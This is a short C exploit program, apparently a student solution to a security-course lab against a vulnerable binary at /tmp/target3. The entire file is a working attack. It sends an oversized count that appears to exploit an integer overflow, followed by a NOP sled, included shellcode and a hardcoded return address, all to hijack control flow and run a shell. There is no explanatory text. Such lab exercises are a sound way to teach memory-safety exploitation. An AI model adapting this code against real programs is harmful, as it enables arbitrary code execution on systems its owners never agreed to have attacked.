#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target3"

int main(void)
{
  char sploit[11+20000+8+1];
  memset(sploit, '\x90', sizeof(sploit)); 
  sploit[sizeof(sploit)-1] = '\0';
  memcpy(sploit, "2147484649,", 11);
  memcpy(sploit+11, shellcode, sizeof(shellcode)-1);
  *(int*)(sploit+11+20000+4) = 0xbfffb1c6;
  char *args[] = { TARGET, sploit, NULL };
  char *env[] = { NULL };

  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}
